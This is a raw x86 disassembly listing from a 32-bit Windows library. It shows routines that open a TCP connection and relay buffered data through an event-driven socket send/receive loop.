10001d75:	8b ec                	mov    %esp,%ebp
10001d77:	83 ec 30             	sub    $0x30,%esp
10001d7a:	56                   	push   %esi
10001d7b:	57                   	push   %edi
10001d7c:	68 f8 00 00 00       	push   $0xf8
10001d81:	e8 5e 4c 00 00       	call   0x100069e4
10001d86:	59                   	pop    %ecx
10001d87:	33 f6                	xor    %esi,%esi
10001d89:	56                   	push   %esi
10001d8a:	56                   	push   %esi
10001d8b:	56                   	push   %esi
10001d8c:	6a 06                	push   $0x6
10001d8e:	6a 01                	push   $0x1
10001d90:	6a 02                	push   $0x2
10001d92:	8b f8                	mov    %eax,%edi
10001d94:	ff 15 5c e2 00 10    	call   *0x1000e25c
10001d9a:	89 45 fc             	mov    %eax,-0x4(%ebp)
10001d9d:	83 f8 ff             	cmp    $0xffffffff,%eax
10001da0:	0f 84 df 00 00 00    	je     0x10001e85
10001da6:	6a 02                	push   $0x2
10001da8:	58                   	pop    %eax
10001da9:	53                   	push   %ebx
10001daa:	66 89 45 d0          	mov    %ax,-0x30(%ebp)
10001dae:	ff 15 54 e2 00 10    	call   *0x1000e254
10001db4:	89 45 d4             	mov    %eax,-0x2c(%ebp)
10001db7:	0f b7 43 10          	movzwl 0x10(%ebx),%eax
10001dbb:	50                   	push   %eax
10001dbc:	ff 15 70 e2 00 10    	call   *0x1000e270
10001dc2:	56                   	push   %esi
10001dc3:	56                   	push   %esi
10001dc4:	56                   	push   %esi
10001dc5:	56                   	push   %esi
10001dc6:	66 89 45 d2          	mov    %ax,-0x2e(%ebp)
10001dca:	6a 10                	push   $0x10
10001dcc:	8d 45 d0             	lea    -0x30(%ebp),%eax
10001dcf:	50                   	push   %eax
10001dd0:	ff 75 fc             	pushl  -0x4(%ebp)
10001dd3:	ff 15 68 e2 00 10    	call   *0x1000e268
10001dd9:	83 f8 ff             	cmp    $0xffffffff,%eax
10001ddc:	0f 84 8f 00 00 00    	je     0x10001e71
10001de2:	8b 45 fc             	mov    -0x4(%ebp),%eax
10001de5:	56                   	push   %esi
10001de6:	56                   	push   %esi
10001de7:	57                   	push   %edi
10001de8:	68 fc 26 00 10       	push   $0x100026fc
10001ded:	89 07                	mov    %eax,(%edi)
10001def:	89 77 10             	mov    %esi,0x10(%edi)
10001df2:	8b 43 14             	mov    0x14(%ebx),%eax
10001df5:	56                   	push   %esi
10001df6:	56                   	push   %esi
10001df7:	89 87 ec 00 00 00    	mov    %eax,0xec(%edi)
10001dfd:	89 9f f0 00 00 00    	mov    %ebx,0xf0(%edi)
10001e03:	ff 15 54 e1 00 10    	call   *0x1000e154
10001e09:	89 45 f8             	mov    %eax,-0x8(%ebp)
10001e0c:	3b c6                	cmp    %esi,%eax
10001e0e:	74 61                	je     0x10001e71
10001e10:	6a 02                	push   $0x2
10001e12:	50                   	push   %eax
10001e13:	ff 15 70 e1 00 10    	call   *0x1000e170
10001e19:	6a 08                	push   $0x8
10001e1b:	58                   	pop    %eax
10001e1c:	66 89 45 e0          	mov    %ax,-0x20(%ebp)
10001e20:	8b 43 18             	mov    0x18(%ebx),%eax
10001e23:	56                   	push   %esi
10001e24:	89 45 e6             	mov    %eax,-0x1a(%ebp)
10001e27:	56                   	push   %esi
10001e28:	8d 45 e0             	lea    -0x20(%ebp),%eax
10001e2b:	89 45 f0             	mov    %eax,-0x10(%ebp)
10001e2e:	56                   	push   %esi
10001e2f:	8d 45 f4             	lea    -0xc(%ebp),%eax
10001e32:	50                   	push   %eax
10001e33:	6a 01                	push   $0x1
10001e35:	8d 45 ec             	lea    -0x14(%ebp),%eax
10001e38:	50                   	push   %eax
10001e39:	c7 45 e2 01 00 00 10 	movl   $0x10000001,-0x1e(%ebp)
10001e40:	c7 45 ec 0a 00 00 00 	movl   $0xa,-0x14(%ebp)
10001e47:	89 75 f4             	mov    %esi,-0xc(%ebp)
10001e4a:	ff 37                	pushl  (%edi)
10001e4c:	ff 15 60 e2 00 10    	call   *0x1000e260
10001e52:	83 f8 ff             	cmp    $0xffffffff,%eax
10001e55:	75 35                	jne    0x10001e8c
10001e57:	ff 15 64 e2 00 10    	call   *0x1000e264
10001e5d:	3d e5 03 00 00       	cmp    $0x3e5,%eax
10001e62:	74 28                	je     0x10001e8c
10001e64:	56                   	push   %esi
10001e65:	ff 75 f8             	pushl  -0x8(%ebp)
10001e68:	ff 15 6c e1 00 10    	call   *0x1000e16c
10001e6e:	89 75 f8             	mov    %esi,-0x8(%ebp)
10001e71:	6a 02                	push   $0x2
10001e73:	ff 75 fc             	pushl  -0x4(%ebp)
10001e76:	ff 15 78 e2 00 10    	call   *0x1000e278
10001e7c:	ff 75 fc             	pushl  -0x4(%ebp)
10001e7f:	ff 15 84 e2 00 10    	call   *0x1000e284
10001e85:	57                   	push   %edi
10001e86:	e8 88 4b 00 00       	call   0x10006a13
10001e8b:	59                   	pop    %ecx
10001e8c:	8b 45 f8             	mov    -0x8(%ebp),%eax
10001e8f:	5f                   	pop    %edi
10001e90:	5e                   	pop    %esi
10001e91:	c9                   	leave  
10001e92:	c3                   	ret    
10001e93:	8b c1                	mov    %ecx,%eax
10001e95:	e8 1b 00 00 00       	call   0x10001eb5
10001e9a:	e8 0b 00 00 00       	call   0x10001eaa
10001e9f:	88 41 08             	mov    %al,0x8(%ecx)
10001ea2:	8b c1                	mov    %ecx,%eax
10001ea4:	c3                   	ret    
10001ea5:	e9 f2 00 00 00       	jmp    0x10001f9c
10001eaa:	83 60 0c 00          	andl   $0x0,0xc(%eax)
10001eae:	b0 01                	mov    $0x1,%al
10001eb0:	c3                   	ret    
10001eb1:	8a 40 08             	mov    0x8(%eax),%al
10001eb4:	c3                   	ret    
10001eb5:	c7 00 e4 69 00 10    	movl   $0x100069e4,(%eax)
10001ebb:	c7 40 04 13 6a 00 10 	movl   $0x10006a13,0x4(%eax)
10001ec2:	c3                   	ret    
10001ec3:	8b 49 0c             	mov    0xc(%ecx),%ecx
10001ec6:	33 c0                	xor    %eax,%eax
10001ec8:	eb 05                	jmp    0x10001ecf
10001eca:	03 41 08             	add    0x8(%ecx),%eax
10001ecd:	8b 09                	mov    (%ecx),%ecx
10001ecf:	85 c9                	test   %ecx,%ecx
10001ed1:	75 f7                	jne    0x10001eca
10001ed3:	c3                   	ret    
10001ed4:	55                   	push   %ebp
10001ed5:	8b ec                	mov    %esp,%ebp
10001ed7:	53                   	push   %ebx
10001ed8:	56                   	push   %esi
10001ed9:	57                   	push   %edi
10001eda:	8b f8                	mov    %eax,%edi
10001edc:	8d 77 0c             	lea    0xc(%edi),%esi
10001edf:	33 db                	xor    %ebx,%ebx
10001ee1:	eb 02                	jmp    0x10001ee5
10001ee3:	8b 36                	mov    (%esi),%esi
10001ee5:	39 1e                	cmp    %ebx,(%esi)
10001ee7:	75 fa                	jne    0x10001ee3
10001ee9:	6a 0c                	push   $0xc
10001eeb:	ff 17                	call   *(%edi)
10001eed:	59                   	pop    %ecx
10001eee:	89 06                	mov    %eax,(%esi)
10001ef0:	3b c3                	cmp    %ebx,%eax
10001ef2:	75 04                	jne    0x10001ef8
10001ef4:	32 c0                	xor    %al,%al
10001ef6:	eb 38                	jmp    0x10001f30
10001ef8:	ff 75 0c             	pushl  0xc(%ebp)
10001efb:	ff 17                	call   *(%edi)
10001efd:	59                   	pop    %ecx
10001efe:	8b 0e                	mov    (%esi),%ecx
10001f00:	89 41 04             	mov    %eax,0x4(%ecx)
10001f03:	8b 06                	mov    (%esi),%eax
10001f05:	39 58 04             	cmp    %ebx,0x4(%eax)
10001f08:	75 09                	jne    0x10001f13
10001f0a:	50                   	push   %eax
10001f0b:	ff 57 04             	call   *0x4(%edi)
10001f0e:	59                   	pop    %ecx
10001f0f:	89 1e                	mov    %ebx,(%esi)
10001f11:	eb e1                	jmp    0x10001ef4
10001f13:	8b 7d 0c             	mov    0xc(%ebp),%edi
10001f16:	57                   	push   %edi
10001f17:	ff 75 08             	pushl  0x8(%ebp)
10001f1a:	89 18                	mov    %ebx,(%eax)
10001f1c:	8b 06                	mov    (%esi),%eax
10001f1e:	ff 70 04             	pushl  0x4(%eax)
10001f21:	e8 ea bd 00 00       	call   0x1000dd10
10001f26:	8b 06                	mov    (%esi),%eax
10001f28:	89 78 08             	mov    %edi,0x8(%eax)
10001f2b:	83 c4 0c             	add    $0xc,%esp
10001f2e:	b0 01                	mov    $0x1,%al
10001f30:	5f                   	pop    %edi
10001f31:	5e                   	pop    %esi
10001f32:	5b                   	pop    %ebx
10001f33:	5d                   	pop    %ebp
10001f34:	c2 08 00             	ret    $0x8
10001f37:	55                   	push   %ebp
10001f38:	8b ec                	mov    %esp,%ebp
10001f3a:	53                   	push   %ebx
10001f3b:	33 db                	xor    %ebx,%ebx
10001f3d:	39 5f 0c             	cmp    %ebx,0xc(%edi)
10001f40:	74 55                	je     0x10001f97
10001f42:	56                   	push   %esi
10001f43:	8b 55 08             	mov    0x8(%ebp),%edx
10001f46:	3b da                	cmp    %edx,%ebx
10001f48:	73 4c                	jae    0x10001f96
10001f4a:	8b 77 0c             	mov    0xc(%edi),%esi
10001f4d:	8b 46 08             	mov    0x8(%esi),%eax
10001f50:	8b ca                	mov    %edx,%ecx
10001f52:	2b cb                	sub    %ebx,%ecx
10001f54:	3b c1                	cmp    %ecx,%eax
10001f56:	76 24                	jbe    0x10001f7c
10001f58:	8b 4e 04             	mov    0x4(%esi),%ecx
10001f5b:	2b c2                	sub    %edx,%eax
10001f5d:	03 c3                	add    %ebx,%eax
10001f5f:	50                   	push   %eax
10001f60:	8b c1                	mov    %ecx,%eax
10001f62:	2b c3                	sub    %ebx,%eax
10001f64:	03 c2                	add    %edx,%eax
10001f66:	50                   	push   %eax
10001f67:	51                   	push   %ecx
10001f68:	e8 a3 bd 00 00       	call   0x1000dd10
10001f6d:	8b c3                	mov    %ebx,%eax
10001f6f:	8b 5d 08             	mov    0x8(%ebp),%ebx
10001f72:	2b c3                	sub    %ebx,%eax
10001f74:	83 c4 0c             	add    $0xc,%esp
10001f77:	01 46 08             	add    %eax,0x8(%esi)
10001f7a:	eb 14                	jmp    0x10001f90
10001f7c:	8b 06                	mov    (%esi),%eax
10001f7e:	89 47 0c             	mov    %eax,0xc(%edi)
10001f81:	ff 76 04             	pushl  0x4(%esi)
10001f84:	03 5e 08             	add    0x8(%esi),%ebx
10001f87:	ff 57 04             	call   *0x4(%edi)
10001f8a:	56                   	push   %esi
10001f8b:	ff 57 04             	call   *0x4(%edi)
10001f8e:	59                   	pop    %ecx
10001f8f:	59                   	pop    %ecx
10001f90:	83 7f 0c 00          	cmpl   $0x0,0xc(%edi)
10001f94:	75 ad                	jne    0x10001f43
10001f96:	5e                   	pop    %esi
10001f97:	5b                   	pop    %ebx
10001f98:	5d                   	pop    %ebp
10001f99:	c2 04 00             	ret    $0x4
10001f9c:	57                   	push   %edi
10001f9d:	8b f8                	mov    %eax,%edi
10001f9f:	8b cf                	mov    %edi,%ecx
10001fa1:	e8 1d ff ff ff       	call   0x10001ec3
10001fa6:	50                   	push   %eax
10001fa7:	e8 8b ff ff ff       	call   0x10001f37
10001fac:	5f                   	pop    %edi
10001fad:	c3                   	ret    
10001fae:	55                   	push   %ebp
10001faf:	8b ec                	mov    %esp,%ebp
10001fb1:	8b 45 08             	mov    0x8(%ebp),%eax
10001fb4:	53                   	push   %ebx
10001fb5:	56                   	push   %esi
10001fb6:	8b 70 0c             	mov    0xc(%eax),%esi
10001fb9:	57                   	push   %edi
10001fba:	33 db                	xor    %ebx,%ebx
10001fbc:	8b f9                	mov    %ecx,%edi
10001fbe:	eb 38                	jmp    0x10001ff8
10001fc0:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10001fc3:	3b d9                	cmp    %ecx,%ebx
10001fc5:	73 35                	jae    0x10001ffc
10001fc7:	8b 46 08             	mov    0x8(%esi),%eax
10001fca:	2b cb                	sub    %ebx,%ecx
10001fcc:	3b c1                	cmp    %ecx,%eax
10001fce:	72 12                	jb     0x10001fe2
10001fd0:	51                   	push   %ecx
10001fd1:	ff 76 04             	pushl  0x4(%esi)
10001fd4:	57                   	push   %edi
10001fd5:	e8 36 bd 00 00       	call   0x1000dd10
10001fda:	8b 5d 0c             	mov    0xc(%ebp),%ebx
10001fdd:	83 c4 0c             	add    $0xc,%esp
10001fe0:	eb 14                	jmp    0x10001ff6
10001fe2:	50                   	push   %eax
10001fe3:	ff 76 04             	pushl  0x4(%esi)
10001fe6:	57                   	push   %edi
10001fe7:	e8 24 bd 00 00       	call   0x1000dd10
10001fec:	8b 46 08             	mov    0x8(%esi),%eax
10001fef:	83 c4 0c             	add    $0xc,%esp
10001ff2:	03 f8                	add    %eax,%edi
10001ff4:	03 d8                	add    %eax,%ebx
10001ff6:	8b 36                	mov    (%esi),%esi
10001ff8:	85 f6                	test   %esi,%esi
10001ffa:	75 c4                	jne    0x10001fc0
10001ffc:	80 7d 10 00          	cmpb   $0x0,0x10(%ebp)
10002000:	74 09                	je     0x1000200b
10002002:	8b 7d 08             	mov    0x8(%ebp),%edi
10002005:	53                   	push   %ebx
10002006:	e8 2c ff ff ff       	call   0x10001f37
1000200b:	5f                   	pop    %edi
1000200c:	5e                   	pop    %esi
1000200d:	8b c3                	mov    %ebx,%eax
1000200f:	5b                   	pop    %ebx
10002010:	5d                   	pop    %ebp
10002011:	c2 0c 00             	ret    $0xc
10002014:	55                   	push   %ebp
10002015:	8b ec                	mov    %esp,%ebp
10002017:	81 ec 98 00 00 00    	sub    $0x98,%esp
1000201d:	53                   	push   %ebx
1000201e:	56                   	push   %esi
1000201f:	8b 75 08             	mov    0x8(%ebp),%esi
10002022:	57                   	push   %edi
10002023:	8b 7e 08             	mov    0x8(%esi),%edi
10002026:	89 7d d0             	mov    %edi,-0x30(%ebp)
10002029:	ff 15 7c e2 00 10    	call   *0x1000e27c
1000202f:	33 db                	xor    %ebx,%ebx
10002031:	89 45 dc             	mov    %eax,-0x24(%ebp)
10002034:	3b c3                	cmp    %ebx,%eax
10002036:	75 0b                	jne    0x10002043
10002038:	ff 15 64 e2 00 10    	call   *0x1000e264
1000203e:	e9 dc 03 00 00       	jmp    0x1000241f
10002043:	89 45 94             	mov    %eax,-0x6c(%ebp)
10002046:	8b 87 ec 00 00 00    	mov    0xec(%edi),%eax
1000204c:	89 45 98             	mov    %eax,-0x68(%ebp)
1000204f:	8b 46 30             	mov    0x30(%esi),%eax
10002052:	89 45 9c             	mov    %eax,-0x64(%ebp)
10002055:	8b 46 28             	mov    0x28(%esi),%eax
10002058:	68 00 00 01 00       	push   $0x10000
1000205d:	89 45 a0             	mov    %eax,-0x60(%ebp)
10002060:	e8 7f 49 00 00       	call   0x100069e4
10002065:	8b d0                	mov    %eax,%edx
10002067:	59                   	pop    %ecx
10002068:	8d 4d c0             	lea    -0x40(%ebp),%ecx
1000206b:	89 55 a4             	mov    %edx,-0x5c(%ebp)
1000206e:	89 55 f0             	mov    %edx,-0x10(%ebp)
10002071:	e8 1d fe ff ff       	call   0x10001e93
10002076:	8d 4d a8             	lea    -0x58(%ebp),%ecx
10002079:	e8 15 fe ff ff       	call   0x10001e93
1000207e:	8d 45 c0             	lea    -0x40(%ebp),%eax
10002081:	e8 2b fe ff ff       	call   0x10001eb1
10002086:	84 c0                	test   %al,%al
10002088:	0f 84 75 03 00 00    	je     0x10002403
1000208e:	8b c1                	mov    %ecx,%eax
10002090:	e8 1c fe ff ff       	call   0x10001eb1
10002095:	84 c0                	test   %al,%al
10002097:	0f 84 66 03 00 00    	je     0x10002403
1000209d:	6a 23                	push   $0x23
1000209f:	ff 75 dc             	pushl  -0x24(%ebp)
100020a2:	ff 77 2c             	pushl  0x2c(%edi)
100020a5:	ff 15 74 e2 00 10    	call   *0x1000e274
100020ab:	33 f6                	xor    %esi,%esi
100020ad:	46                   	inc    %esi
100020ae:	68 00 00 01 00       	push   $0x10000
100020b3:	89 5d f8             	mov    %ebx,-0x8(%ebp)
100020b6:	89 5d e8             	mov    %ebx,-0x18(%ebp)
100020b9:	89 75 f4             	mov    %esi,-0xc(%ebp)
100020bc:	e8 23 49 00 00       	call   0x100069e4
100020c1:	59                   	pop    %ecx
100020c2:	89 45 d8             	mov    %eax,-0x28(%ebp)
100020c5:	8d 4d a8             	lea    -0x58(%ebp),%ecx
100020c8:	89 5d bc             	mov    %ebx,-0x44(%ebp)
100020cb:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
100020ce:	89 5d b8             	mov    %ebx,-0x48(%ebp)
100020d1:	e8 ed fd ff ff       	call   0x10001ec3
100020d6:	85 c0                	test   %eax,%eax
100020d8:	74 7c                	je     0x10002156
100020da:	8b 45 08             	mov    0x8(%ebp),%eax
100020dd:	8b 48 34             	mov    0x34(%eax),%ecx
100020e0:	e8 9a 03 00 00       	call   0x1000247f
100020e5:	3d 00 00 10 00       	cmp    $0x100000,%eax
100020ea:	73 6a                	jae    0x10002156
100020ec:	8d 75 e0             	lea    -0x20(%ebp),%esi
100020ef:	e8 f2 04 00 00       	call   0x100025e6
100020f4:	8b c6                	mov    %esi,%eax
100020f6:	e8 93 64 00 00       	call   0x1000858e
100020fb:	85 c0                	test   %eax,%eax
100020fd:	74 4c                	je     0x1000214b
100020ff:	8b c6                	mov    %esi,%eax
10002101:	e8 7e 05 00 00       	call   0x10002684
10002106:	8b f0                	mov    %eax,%esi
10002108:	8b 5d 08             	mov    0x8(%ebp),%ebx
1000210b:	ff 73 04             	pushl  0x4(%ebx)
1000210e:	8d 45 e0             	lea    -0x20(%ebp),%eax
10002111:	ff 33                	pushl  (%ebx)
10002113:	e8 80 05 00 00       	call   0x10002698
10002118:	6a 01                	push   $0x1
1000211a:	68 f4 ff 00 00       	push   $0xfff4
1000211f:	8d 45 a8             	lea    -0x58(%ebp),%eax
10002122:	50                   	push   %eax
10002123:	8b ce                	mov    %esi,%ecx
10002125:	e8 84 fe ff ff       	call   0x10001fae
1000212a:	ff 73 04             	pushl  0x4(%ebx)
1000212d:	ff 33                	pushl  (%ebx)
1000212f:	8b d8                	mov    %eax,%ebx
10002131:	8b 45 08             	mov    0x8(%ebp),%eax
10002134:	8b 40 34             	mov    0x34(%eax),%eax
10002137:	56                   	push   %esi
10002138:	e8 93 03 00 00       	call   0x100024d0
1000213d:	8d 4d a8             	lea    -0x58(%ebp),%ecx
10002140:	e8 7e fd ff ff       	call   0x10001ec3
10002145:	85 c0                	test   %eax,%eax
10002147:	75 bf                	jne    0x10002108
10002149:	33 db                	xor    %ebx,%ebx
1000214b:	8d 45 e0             	lea    -0x20(%ebp),%eax
1000214e:	e8 26 3a 00 00       	call   0x10005b79
10002153:	33 f6                	xor    %esi,%esi
10002155:	46                   	inc    %esi
10002156:	8d 4d c0             	lea    -0x40(%ebp),%ecx
10002159:	e8 65 fd ff ff       	call   0x10001ec3
1000215e:	85 c0                	test   %eax,%eax
10002160:	74 7a                	je     0x100021dc
10002162:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
10002165:	75 75                	jne    0x100021dc
10002167:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
1000216a:	0f 84 37 02 00 00    	je     0x100023a7
10002170:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10002173:	53                   	push   %ebx
10002174:	68 00 00 01 00       	push   $0x10000
10002179:	8d 45 c0             	lea    -0x40(%ebp),%eax
1000217c:	50                   	push   %eax
1000217d:	e8 2c fe ff ff       	call   0x10001fae
10002182:	53                   	push   %ebx
10002183:	53                   	push   %ebx
10002184:	89 45 ec             	mov    %eax,-0x14(%ebp)
10002187:	53                   	push   %ebx
10002188:	8d 45 e4             	lea    -0x1c(%ebp),%eax
1000218b:	50                   	push   %eax
1000218c:	56                   	push   %esi
1000218d:	8d 45 ec             	lea    -0x14(%ebp),%eax
10002190:	50                   	push   %eax
10002191:	ff 77 2c             	pushl  0x2c(%edi)
10002194:	ff 15 60 e2 00 10    	call   *0x1000e260
1000219a:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000219d:	83 f8 ff             	cmp    $0xffffffff,%eax
100021a0:	74 26                	je     0x100021c8
100021a2:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
100021a5:	3b 4d ec             	cmp    -0x14(%ebp),%ecx
100021a8:	72 1e                	jb     0x100021c8
100021aa:	3b c3                	cmp    %ebx,%eax
100021ac:	0f 85 f0 01 00 00    	jne    0x100023a2
100021b2:	51                   	push   %ecx
100021b3:	8d 7d c0             	lea    -0x40(%ebp),%edi
100021b6:	89 5d e8             	mov    %ebx,-0x18(%ebp)
100021b9:	e8 79 fd ff ff       	call   0x10001f37
100021be:	8b 7d d0             	mov    -0x30(%ebp),%edi
100021c1:	33 db                	xor    %ebx,%ebx
100021c3:	e9 fd fe ff ff       	jmp    0x100020c5
100021c8:	ff 15 64 e2 00 10    	call   *0x1000e264
100021ce:	3d 33 27 00 00       	cmp    $0x2733,%eax
100021d3:	0f 85 c9 01 00 00    	jne    0x100023a2
100021d9:	89 75 e8             	mov    %esi,-0x18(%ebp)
100021dc:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
100021df:	0f 84 c2 01 00 00    	je     0x100023a7
100021e5:	56                   	push   %esi
100021e6:	68 b8 0b 00 00       	push   $0xbb8
100021eb:	53                   	push   %ebx
100021ec:	8d 45 94             	lea    -0x6c(%ebp),%eax
100021ef:	50                   	push   %eax
100021f0:	6a 04                	push   $0x4
100021f2:	ff 15 8c e2 00 10    	call   *0x1000e28c
100021f8:	89 45 f8             	mov    %eax,-0x8(%ebp)
100021fb:	3b c3                	cmp    %ebx,%eax
100021fd:	0f 85 25 01 00 00    	jne    0x10002328
10002203:	6a 2c                	push   $0x2c
10002205:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
1000220b:	53                   	push   %ebx
1000220c:	50                   	push   %eax
1000220d:	e8 18 bb 00 00       	call   0x1000dd2a
10002212:	83 c4 0c             	add    $0xc,%esp
10002215:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
1000221b:	50                   	push   %eax
1000221c:	ff 75 dc             	pushl  -0x24(%ebp)
1000221f:	ff 77 2c             	pushl  0x2c(%edi)
10002222:	ff 15 6c e2 00 10    	call   *0x1000e26c
10002228:	83 f8 ff             	cmp    $0xffffffff,%eax
1000222b:	0f 84 41 01 00 00    	je     0x10002372
10002231:	f6 85 68 ff ff ff 02 	testb  $0x2,-0x98(%ebp)
10002238:	74 7b                	je     0x100022b5
1000223a:	39 9d 70 ff ff ff    	cmp    %ebx,-0x90(%ebp)
10002240:	75 73                	jne    0x100022b5
10002242:	eb 4f                	jmp    0x10002293
10002244:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10002247:	53                   	push   %ebx
10002248:	68 00 00 01 00       	push   $0x10000
1000224d:	8d 45 c0             	lea    -0x40(%ebp),%eax
10002250:	50                   	push   %eax
10002251:	e8 58 fd ff ff       	call   0x10001fae
10002256:	53                   	push   %ebx
10002257:	53                   	push   %ebx
10002258:	89 45 ec             	mov    %eax,-0x14(%ebp)
1000225b:	53                   	push   %ebx
1000225c:	8d 45 e4             	lea    -0x1c(%ebp),%eax
1000225f:	50                   	push   %eax
10002260:	56                   	push   %esi
10002261:	8d 45 ec             	lea    -0x14(%ebp),%eax
10002264:	50                   	push   %eax
10002265:	ff 77 2c             	pushl  0x2c(%edi)
10002268:	ff 15 60 e2 00 10    	call   *0x1000e260
1000226e:	89 45 f8             	mov    %eax,-0x8(%ebp)
10002271:	83 f8 ff             	cmp    $0xffffffff,%eax
10002274:	74 2b                	je     0x100022a1
10002276:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
10002279:	3b 4d ec             	cmp    -0x14(%ebp),%ecx
1000227c:	72 23                	jb     0x100022a1
1000227e:	3b c3                	cmp    %ebx,%eax
10002280:	75 11                	jne    0x10002293
10002282:	51                   	push   %ecx
10002283:	8d 7d c0             	lea    -0x40(%ebp),%edi
10002286:	89 5d e8             	mov    %ebx,-0x18(%ebp)
10002289:	e8 a9 fc ff ff       	call   0x10001f37
1000228e:	8b 7d d0             	mov    -0x30(%ebp),%edi
10002291:	33 db                	xor    %ebx,%ebx
10002293:	8d 4d c0             	lea    -0x40(%ebp),%ecx
10002296:	e8 28 fc ff ff       	call   0x10001ec3
1000229b:	85 c0                	test   %eax,%eax
1000229d:	75 a5                	jne    0x10002244
1000229f:	eb 14                	jmp    0x100022b5
100022a1:	ff 15 64 e2 00 10    	call   *0x1000e264
100022a7:	3d 33 27 00 00       	cmp    $0x2733,%eax
100022ac:	0f 85 f5 00 00 00    	jne    0x100023a7
100022b2:	89 75 e8             	mov    %esi,-0x18(%ebp)
100022b5:	f6 85 68 ff ff ff 01 	testb  $0x1,-0x98(%ebp)
100022bc:	74 57                	je     0x10002315
100022be:	39 9d 6c ff ff ff    	cmp    %ebx,-0x94(%ebp)
100022c4:	75 4f                	jne    0x10002315
100022c6:	53                   	push   %ebx
100022c7:	53                   	push   %ebx
100022c8:	8d 45 b8             	lea    -0x48(%ebp),%eax
100022cb:	50                   	push   %eax
100022cc:	8d 45 bc             	lea    -0x44(%ebp),%eax
100022cf:	50                   	push   %eax
100022d0:	56                   	push   %esi
100022d1:	8d 45 ec             	lea    -0x14(%ebp),%eax
100022d4:	50                   	push   %eax
100022d5:	c7 45 ec 00 00 01 00 	movl   $0x10000,-0x14(%ebp)
100022dc:	ff 77 2c             	pushl  0x2c(%edi)
100022df:	89 5d b8             	mov    %ebx,-0x48(%ebp)
100022e2:	ff 15 58 e2 00 10    	call   *0x1000e258
100022e8:	83 f8 ff             	cmp    $0xffffffff,%eax
100022eb:	0f 84 9f 00 00 00    	je     0x10002390
100022f1:	8b 45 bc             	mov    -0x44(%ebp),%eax
100022f4:	89 45 ec             	mov    %eax,-0x14(%ebp)
100022f7:	3b c3                	cmp    %ebx,%eax
100022f9:	74 17                	je     0x10002312
100022fb:	50                   	push   %eax
100022fc:	ff 75 f0             	pushl  -0x10(%ebp)
100022ff:	8d 45 a8             	lea    -0x58(%ebp),%eax
10002302:	e8 cd fb ff ff       	call   0x10001ed4
10002307:	81 7d ec 00 00 01 00 	cmpl   $0x10000,-0x14(%ebp)
1000230e:	74 b6                	je     0x100022c6
10002310:	eb 03                	jmp    0x10002315
10002312:	89 5d f4             	mov    %ebx,-0xc(%ebp)
10002315:	f6 85 68 ff ff ff 20 	testb  $0x20,-0x98(%ebp)
1000231c:	74 54                	je     0x10002372
1000231e:	39 5d 80             	cmp    %ebx,-0x80(%ebp)
10002321:	75 4f                	jne    0x10002372
10002323:	89 5d f4             	mov    %ebx,-0xc(%ebp)
10002326:	eb 4a                	jmp    0x10002372
10002328:	3b c6                	cmp    %esi,%eax
1000232a:	74 5f                	je     0x1000238b
1000232c:	83 f8 02             	cmp    $0x2,%eax
1000232f:	74 6a                	je     0x1000239b
10002331:	83 f8 03             	cmp    $0x3,%eax
10002334:	75 3c                	jne    0x10002372
10002336:	8b 75 08             	mov    0x8(%ebp),%esi
10002339:	83 c6 0c             	add    $0xc,%esi
1000233c:	e8 7e 02 00 00       	call   0x100025bf
10002341:	eb 28                	jmp    0x1000236b
10002343:	ff 75 d8             	pushl  -0x28(%ebp)
10002346:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
10002349:	33 db                	xor    %ebx,%ebx
1000234b:	8d 45 d4             	lea    -0x2c(%ebp),%eax
1000234e:	e8 e2 01 00 00       	call   0x10002535
10002353:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
10002356:	74 48                	je     0x100023a0
10002358:	ff 75 d4             	pushl  -0x2c(%ebp)
1000235b:	8d 45 c0             	lea    -0x40(%ebp),%eax
1000235e:	ff 75 d8             	pushl  -0x28(%ebp)
10002361:	e8 6e fb ff ff       	call   0x10001ed4
10002366:	e8 54 02 00 00       	call   0x100025bf
1000236b:	85 c0                	test   %eax,%eax
1000236d:	75 d4                	jne    0x10002343
1000236f:	33 f6                	xor    %esi,%esi
10002371:	46                   	inc    %esi
10002372:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
10002375:	0f 85 4a fd ff ff    	jne    0x100020c5
1000237b:	8d 4d a8             	lea    -0x58(%ebp),%ecx
1000237e:	e8 40 fb ff ff       	call   0x10001ec3
10002383:	85 c0                	test   %eax,%eax
10002385:	0f 85 3a fd ff ff    	jne    0x100020c5
1000238b:	89 5d f8             	mov    %ebx,-0x8(%ebp)
1000238e:	eb 12                	jmp    0x100023a2
10002390:	ff 15 64 e2 00 10    	call   *0x1000e264
10002396:	89 45 f8             	mov    %eax,-0x8(%ebp)
10002399:	eb 07                	jmp    0x100023a2
1000239b:	89 75 f8             	mov    %esi,-0x8(%ebp)
1000239e:	eb 02                	jmp    0x100023a2
100023a0:	33 db                	xor    %ebx,%ebx
100023a2:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
100023a5:	75 19                	jne    0x100023c0
100023a7:	8b 45 08             	mov    0x8(%ebp),%eax
100023aa:	ff 70 04             	pushl  0x4(%eax)
100023ad:	33 db                	xor    %ebx,%ebx
100023af:	ff 30                	pushl  (%eax)
100023b1:	8d 45 08             	lea    0x8(%ebp),%eax
100023b4:	50                   	push   %eax
100023b5:	8b 45 08             	mov    0x8(%ebp),%eax
100023b8:	8b 40 34             	mov    0x34(%eax),%eax
100023bb:	e8 10 01 00 00       	call   0x100024d0
100023c0:	53                   	push   %ebx
100023c1:	ff 77 2c             	pushl  0x2c(%edi)
100023c4:	ff 15 78 e2 00 10    	call   *0x1000e278
100023ca:	ff 77 2c             	pushl  0x2c(%edi)
100023cd:	ff 15 84 e2 00 10    	call   *0x1000e284
100023d3:	ff 75 a4             	pushl  -0x5c(%ebp)
100023d6:	e8 38 46 00 00       	call   0x10006a13
100023db:	59                   	pop    %ecx
100023dc:	ff 75 dc             	pushl  -0x24(%ebp)
